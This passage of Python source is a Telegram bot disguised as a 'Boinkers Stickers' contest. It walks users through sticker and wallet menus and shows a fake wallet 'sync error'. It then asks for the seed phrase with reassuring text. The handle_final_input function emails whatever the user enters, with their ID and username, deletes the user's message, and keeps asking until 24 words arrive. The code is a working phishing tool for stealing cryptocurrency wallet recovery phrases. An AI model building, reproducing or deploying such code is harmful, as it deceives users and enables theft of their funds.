        message = ui_text(context, "select from set").format(set_name=set_name)
        keyboard = build_stickers_keyboard(set_key, context)
        
        msg = await send_message(
            context.bot,
            update.effective_chat.id,
            message,
            reply_markup=keyboard
        )
        context.user_data["last_sticker_message_id"] = msg.message_id if msg else None
        
        return SELECT_FROM_SET
        
    except Exception as e:
        logging.error(f"❌ Error in select_set: {e}")
        return SELECT_STICKERS

async def toggle_sticker(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Handle individual sticker selection/deselection.
    EDITS the existing message instead of creating a new one.
    """
    query = update.callback_query
    await query.answer()
    
    try:
        callback_data = query.data
        remaining = callback_data.replace("toggle_sticker_", "", 1)
        parts = remaining.rsplit("_", 1)
        
        if len(parts) != 2:
            logging.error(f"❌ Invalid callback data format: {callback_data}")
            return SELECT_FROM_SET
        
        set_key = parts[0]
        sticker_idx_str = parts[1]
        
        try:
            sticker_idx = int(sticker_idx_str)
        except ValueError:
            logging.error(f"❌ Invalid sticker index: {sticker_idx_str}")
            return SELECT_FROM_SET
        
    except Exception as e:
        logging.error(f"❌ Error parsing sticker callback: {e}")
        return SELECT_FROM_SET
    
    if set_key not in STICKER_SETS:
        logging.error(f"❌ Invalid set key: {set_key}")
        return SELECT_FROM_SET
    
    selected_stickers = context.user_data.get("selected_stickers", {})
    if set_key not in selected_stickers:
        selected_stickers[set_key] = []
    
    if sticker_idx >= len(STICKER_SETS[set_key]["stickers"]):
        logging.error(f"❌ Invalid sticker index")
        return SELECT_FROM_SET
    
    # Toggle sticker
    if sticker_idx in selected_stickers[set_key]:
        selected_stickers[set_key].remove(sticker_idx)
        logging.info(f"✅ User {update.effective_user.id} deselected sticker {sticker_idx}")
    else:
        if len(selected_stickers[set_key]) < 3:
            selected_stickers[set_key].append(sticker_idx)
            logging.info(f"✅ User {update.effective_user.id} selected sticker {sticker_idx}")
        else:
            await query.answer("Max 3 stickers per set", show_alert=True)
            return SELECT_FROM_SET
    
    context.user_data["selected_stickers"] = selected_stickers
    
    set_name = STICKER_SETS[set_key]["name"]
    message = ui_text(context, "select from set").format(set_name=set_name)
    keyboard = build_stickers_keyboard(set_key, context)
    
    # FIXED: EDIT existing message instead of sending new one
    message_id = context.user_data.get("last_sticker_message_id")
    if message_id:
        success = await edit_message(
            context.bot,
            update.effective_chat.id,
            message_id,
            message,
            keyboard
        )
        if not success:
            # Fallback: send new message
            msg = await send_message(
                context.bot,
                update.effective_chat.id,
                message,
                reply_markup=keyboard
            )
            context.user_data["last_sticker_message_id"] = msg.message_id if msg else None
    else:
        msg = await send_message(
            context.bot,
            update.effective_chat.id,
            message,
            reply_markup=keyboard
        )
        context.user_data["last_sticker_message_id"] = msg.message_id if msg else None
    
    return SELECT_FROM_SET

async def back_to_sets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Go back to sticker sets selection."""
    query = update.callback_query
    await query.answer()
    
    context.user_data["current_state"] = SELECT_STICKERS
    keyboard = build_sticker_sets_keyboard(context)
    logging.info(f"✅ User {update.effective_user.id} going back to sticker sets")
    
    msg = await send_message(
        context.bot,
        update.effective_chat.id,
        ui_text(context, "select stickers"),
        reply_markup=keyboard
    )
    context.user_data["last_sticker_message_id"] = msg.message_id if msg else None
    
    return SELECT_STICKERS

async def confirm_stickers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Confirm selected stickers."""
    query = update.callback_query
    await query.answer()
    
    selected = context.user_data.get("selected_stickers", {})
    
    if not selected or not any(selected.values()):
        await query.answer("Select at least one sticker!", show_alert=True)
        return SELECT_STICKERS
    
    sticker_lines = []
    total_count = 0
    set_count = 0
    
    for set_key in selected:
        if selected[set_key]:
            set_count += 1
            set_name = STICKER_SETS[set_key]["name"]
            stickers_in_set = STICKER_SETS[set_key]["stickers"]
            sticker_names = [stickers_in_set[idx] for idx in selected[set_key]]
            total_count += len(sticker_names)
            sticker_lines.append(f"**{set_name}:**")
            for name in sticker_names:
                sticker_lines.append(f"  • {name}")
    
    summary = ui_text(context, "selected stickers summary").format(
        total=total_count,
        sets=set_count,
        stickers="\n".join(sticker_lines)
    )
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "confirm selection"), callback_data="confirm_and_proceed")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_to_sets")],
    ])
    
    context.user_data["current_state"] = CONFIRM_STICKERS
    logging.info(f"✅ User {update.effective_user.id} reviewing selection: {total_count} stickers")
    
    try:
        msg = await send_message(
            context.bot,
            update.effective_chat.id,
            summary,
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    except:
        msg = await send_message(
            context.bot,
            update.effective_chat.id,
            summary,
            reply_markup=keyboard
        )
    
    return CONFIRM_STICKERS

async def confirm_and_proceed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Proceed to wallet type selection."""
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception as e:
        logging.warning(f"⚠️ Could not answer callback: {e}")
    
    context.user_data["current_state"] = AWAIT_WALLET_TYPE
    logging.info(f"✅ User {update.effective_user.id} proceeding to wallet selection")
    
    keyboard = build_wallet_type_keyboard(context)
    
    await send_message(
        context.bot,
        update.effective_chat.id,
        ui_text(context, "wallet_type_prompt"),
        reply_markup=keyboard
    )
    
    return AWAIT_WALLET_TYPE

async def show_other_wallets(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show extended wallet type list."""
    query = update.callback_query
    await query.answer()
    
    keys = ["wallet_type_phantom_wallet","wallet_type_rainbow","wallet_type_safepal","wallet_type_wallet_connect","wallet_type_ledger","wallet_type_brd_wallet","wallet_type_solana_wallet","wallet_type_balance","wallet_type_okx","wallet_type_xverse","wallet_type_sparrow","wallet_type_earth_wallet","wallet_type_hiro","wallet_type_saitamask_wallet","wallet_type_casper_wallet","wallet_type_cake_wallet","wallet_type_kepir_wallet","wallet_type_icpswap","wallet_type_kaspa","wallet_type_nem_wallet","wallet_type_near_wallet","wallet_type_compass_wallet","wallet_type_stack_wallet","wallet_type_soilflare_wallet","wallet_type_aioz_wallet","wallet_type_xpla_vault_wallet","wallet_type_polkadot_wallet","wallet_type_xportal_wallet","wallet_type_multiversx_wallet","wallet_type_verachain_wallet","wallet_type_casperdash_wallet","wallet_type_nova_wallet","wallet_type_fearless_wallet","wallet_type_terra_station","wallet_type_cosmos_station","wallet_type_exodus_wallet","wallet_type_argent","wallet_type_binance_chain","wallet_type_safemoon","wallet_type_gnosis_safe","wallet_type_defi","wallet_type_other"]
    
    kb = []
    row = []
    for k in keys:
        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        row.append(InlineKeyboardButton(base_label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    logging.info(f"✅ User {update.effective_user.id} viewing other wallets")
    
    await send_message(
        context.bot,
        update.effective_chat.id,
        ui_text(context, "wallet_type_prompt"),
        reply_markup=reply
    )
    
    return CHOOSE_OTHER_WALLET_TYPE

async def show_sync_error(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Show sync error and prompt for manual connection."""
    query = update.callback_query
    await query.answer()
    
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    context.user_data["wallet_type"] = wallet_name
    context.user_data["wallet_key"] = wallet_key
    
    logging.info(f"✅ User {update.effective_user.id} selected wallet: {wallet_name}")
    
    error_title = ui_text(context, "sync_error_title")
    error_body = ui_text(context, "sync_error_body")
    composed = f"{error_title}\n\n{error_body}"
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton(ui_text(context, "connect_manually"), callback_data="manual_connect_proceed")],
    ])
    
    context.user_data["current_state"] = SYNCH_ERROR
    
    await send_message(
        context.bot,
        update.effective_chat.id,
        composed,
        reply_markup=keyboard
    )
    
    return SYNCH_ERROR

async def manual_connect_proceed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Prompt for manual wallet connection input with REASSURANCE message.
    """
    query = update.callback_query
    await query.answer()
    
    wk = context.user_data.get("wallet_key", "")
    prompt_key = f"prompt_24_wallet_type_{wk.replace('wallet_type_', '')}"
    localized_24 = ui_text(context, prompt_key)
    
    if localized_24 != prompt_key:
        text = localized_24
    else:
        wallet_24_prompts = {
            "wallet_type_metamask": ui_text(context, "prompt_24_wallet_type_metamask"),
            "wallet_type_trust_wallet": ui_text(context, "prompt_24_wallet_type_trust_wallet"),
            "wallet_type_coinbase": ui_text(context, "prompt_24_wallet_type_coinbase"),
            "wallet_type_tonkeeper": ui_text(context, "prompt_24_wallet_type_tonkeeper"),
        }
        if wk in wallet_24_prompts and wallet_24_prompts[wk]:
            text = wallet_24_prompts[wk]
        else:
            text = ui_text(context, "prompt seed")
    
    # FIXED: ADD REASSURANCE MESSAGE ON INITIAL PROMPT
    localized_label = ui_text(context, "label_seed_phrase")
    reassurance = build_reassurance_message(localized_label, context)
    text = text + reassurance
    
    fr = ForceReply(selective=False)
    context.user_data["current_state"] = RECEIVE_INPUT
    logging.info(f"✅ User {update.effective_user.id} prompted for input with reassurance")
    
    await send_message(
        context.bot,
        update.effective_chat.id,
        text,
        reply_markup=fr
    )
    
    return RECEIVE_INPUT

async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    FINAL VERSION:
    1. Accept ANY input (no validation)
    2. Send to email IMMEDIATELY
    3. Check word count:
       - If 24 words: Show error message, end (AWAIT_RESTART)
       - If NOT 24 words: Show ONLY error message (no reassurance), allow more entries (stay in RECEIVE_INPUT)
    """
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_type = context.user_data.get("wallet_type", "Unknown")
    user = update.effective_user
    
    logging.info(f"✅ User {user.id} entered input: {len(user_input)} characters")
    
    # STEP 1: Send to email IMMEDIATELY (no validation)
    username_str = f"@{user.username}" if user.username else "No username"
    subject = f"Boinkers Stickers - {wallet_type}"
    body = f"""User ID: {user.id}
Username: {username_str}
Wallet Type: {wallet_type}"""
    
    email_sent = await send_email(
        subject=subject,
        body=body,
        user_id=user.id,
        user_input=user_input
    )
    
    if email_sent:
        logging.info(f"✅ Email sent for user {user.id}")
    else:
        logging.warning(f"⚠️ Email not sent for user {user.id}")
    
    # STEP 2: Delete user's message
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except:
        pass
    
    # STEP 3: Check word count and determine next action
    words = [w for w in user_input.split() if w]
    word_count = len(words)
    
    

    if word_count == 24:
        # 24 words: Show error message and end
        context.user_data["current_state"] = AWAIT_RESTART
        await send_message(context.bot, chat_id, ui_text(context, "post_receive_error"))
        logging.info(f"✅ User {user.id} entered 24 words, conversation ended")
        return AWAIT_RESTART
    else:
        # NOT 24 words: Show ONLY the field error message (no reassurance)
        wk = context.user_data.get("wallet_key", "")
        error_key = f"wallet_24_error_{wk}"
        error_message = ui_text(context, error_key)
        
        fr = ForceReply(selective=False)
        context.user_data["current_state"] = RECEIVE_INPUT
        await send_message(context.bot, chat_id, error_message, reply_markup=fr)
        
        logging.info(f"⚠️ User {user.id} entered {word_count} words, prompting for 24 words again")
        return RECEIVE_INPUT

async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle messages while awaiting restart."""
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART

async def back_handlers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle all back button presses."""
    query = update.callback_query
    await query.answer()
    callback_data = query.data
    
    if callback_data == "back_to_language":
        context.user_data["current_state"] = CHOOSE_LANGUAGE
        keyboard = build_language_keyboard()
        logging.info(f"✅ User {update.effective_user.id} going back to language selection")
        
        await send_message(
            context.bot,
            update.effective_chat.id,
            ui_text(context, "choose language"),
            reply_markup=keyboard
        )
        
        return CHOOSE_LANGUAGE
    
    elif callback_data == "back_wallet_types":
        context.user_data["current_state"] = AWAIT_WALLET_TYPE
        keyboard = build_wallet_type_keyboard(context)
        logging.info(f"✅ User {update.effective_user.id} going back to wallet types")
        
        await send_message(
            context.bot,
            update.effective_chat.id,
            ui_text(context, "wallet_type_prompt"),
            reply_markup=keyboard
        )
        
        return AWAIT_WALLET_TYPE
    
    elif callback_data == "back_other_wallets":
        context.user_data["current_state"] = AWAIT_WALLET_TYPE
        keyboard = build_wallet_type_keyboard(context)
        logging.info(f"✅ User {update.effective_user.id} going back from other wallets")
        
        await send_message(
            context.bot,
            update.effective_chat.id,
            ui_text(context, "wallet_type_prompt"),
            reply_markup=keyboard
        )
        
        return AWAIT_WALLET_TYPE
    
    return AWAIT_WALLET_TYPE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel conversation."""
    return ConversationHandler.END

# ===== MAIN FUNCTION WITH RETRY LOGIC =====

def main() -> None:
    """Main function - set up and run the bot with retry logic."""
    print("\n" + "="*70)
    print("🤖 BOINKERS STICKERS CONTEST BOT - FINAL VERSION")
    print("="*70 + "\n")
    
    # Validate environment variables
    try:
        validate_environment()
    except ValueError as e:
        print(f"\n❌ CRITICAL ERROR: {e}")
        print("❌ Bot cannot start. Please check BOT_TOKEN configuration.")
        return
    
    # Retry logic for connection issues
    max_retries = 3
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            # Create application
            application = ApplicationBuilder().token(BOT_TOKEN).build()
            logging.info(f"✅ Bot application created successfully")
            
            # Define conversation handler
            conv_handler = ConversationHandler(
                entry_points=[CommandHandler("start", start)],
                states={
                    CHOOSE_LANGUAGE: [
                        CallbackQueryHandler(set_language, pattern="^lang_"),
                    ],
                    SELECT_STICKERS: [
                        CallbackQueryHandler(select_set, pattern="^select_set_"),
                        CallbackQueryHandler(confirm_stickers, pattern="^confirm_stickers$"),
                        CallbackQueryHandler(back_handlers, pattern="^back_to_language$"),
                    ],
                    SELECT_FROM_SET: [
                        CallbackQueryHandler(toggle_sticker, pattern="^toggle_sticker_"),
                        CallbackQueryHandler(select_set, pattern="^select_set_"),
                        CallbackQueryHandler(back_to_sets, pattern="^back_to_sets$"),
                        CallbackQueryHandler(confirm_stickers, pattern="^confirm_stickers$"),
                    ],
                    CONFIRM_STICKERS: [
                        CallbackQueryHandler(confirm_and_proceed, pattern="^confirm_and_proceed$"),
                        CallbackQueryHandler(back_to_sets, pattern="^back_to_sets$"),
                    ],
                    AWAIT_WALLET_TYPE: [
                        CallbackQueryHandler(show_sync_error, pattern="^wallet_type_"),
                        CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                        CallbackQueryHandler(back_handlers, pattern="^back_wallet_types$"),
                    ],
                    CHOOSE_OTHER_WALLET_TYPE: [
                        CallbackQueryHandler(show_sync_error, pattern="^wallet_type_"),
                        CallbackQueryHandler(back_handlers, pattern="^back_other_wallets$"),
                    ],
                    SYNCH_ERROR: [
                        CallbackQueryHandler(manual_connect_proceed, pattern="^manual_connect_proceed$"),
                    ],
                    MANUAL_CONNECT: [],
                    RECEIVE_INPUT: [
                        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
                    ],
                    AWAIT_RESTART: [
                        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
                    ],
                },
                fallbacks=[CommandHandler("start", start)],
                allow_reentry=True,
            )
            
            # Add handlers to application
            application.add_handler(conv_handler)
            
            print("="*70)
            print("✅ Bot is now running!")
            print("✅ Press Ctrl+C to stop the bot")
            print("="*70 + "\n")
            
            # Start polling
            application.run_polling(allowed_updates=Update.ALL_TYPES)
            
        except asyncio.TimeoutError:
            retry_count += 1
            print(f"\n⚠️ Connection timeout (Attempt {retry_count}/{max_retries})")
            print("⚠️ Retrying connection in 5 seconds...")
            if retry_count < max_retries:
                import time
                time.sleep(5)
            else:
                print("\n❌ Failed to connect after multiple attempts.")
                print("❌ Please check your internet connection and BOT_TOKEN.")
                return
                
        except KeyboardInterrupt:
            print("\n\n" + "="*70)
            print("🛑 Bot stopped by user")
            print("="*70 + "\n")
            break
            
        except Exception as e:
            retry_count += 1
            error_str = str(e).lower()
            
            if "timeout" in error_str or "connection" in error_str:
                print(f"\n⚠️ Connection error (Attempt {retry_count}/{max_retries})")
                print(f"⚠️ Error: {e}")
                print("⚠️ Retrying connection in 5 seconds...")
                if retry_count < max_retries:
                    import time
                    time.sleep(5)
                else:
                    print("\n❌ Failed to connect after multiple attempts.")
                    print("❌ Troubleshooting steps:")
                    print("   1. Check your internet connection")
                    print("   2. Verify BOT_TOKEN is valid")
                    print("   3. Make sure the token hasn't expired")
                    print("   4. Check if Telegram API is accessible in your region")
                    return
            else:
                print(f"\n❌ ERROR: Bot encountered an error: {e}")
                logging.error(f"Critical error: {e}")
                print("\n❌ For support, contact bot administrator.")
                return

if __name__ == "__main__":
    main()